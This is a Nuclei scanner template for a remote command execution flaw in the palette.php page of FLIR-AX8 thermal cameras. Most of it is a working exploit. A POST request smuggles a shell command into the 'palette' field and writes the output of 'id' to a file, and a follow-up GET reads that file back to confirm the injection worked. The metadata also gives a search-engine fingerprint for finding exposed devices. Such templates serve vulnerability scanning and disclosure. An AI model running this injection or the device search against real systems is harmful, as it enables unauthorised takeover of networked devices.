id: flir-palette-rce
info:
  name: FLIR-AX8 热成像仪 palette.php - rce
  author: leadlife
  severity: critical
  description: FLIR-AX8热成像仪palette.php存在远程命令执行漏洞，允许攻击者在目标服务器上执行任意系统命令，可能导致服务器被完全控制、数据泄露或破坏，严重威胁系统安全。
  reference: 
    - https://github.com/wy876/POC/blob/main/FLIR/FLIR-AX8%E7%83%AD%E6%88%90%E5%83%8F%E4%BB%AApalette.php%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: demo
    hunter-query: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
  tags: flir,rce

http:
  - raw:
      - |
        POST /palette.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: ****
        Upgrade-Insecure-Requests: 1
        Priority: u=0, i
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 19

        palette=;id>{{randstr}}.txt;
      
      - |+
        GET /{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_1,'success')
          - contains_all(body_2,'uid','gid')
        condition: and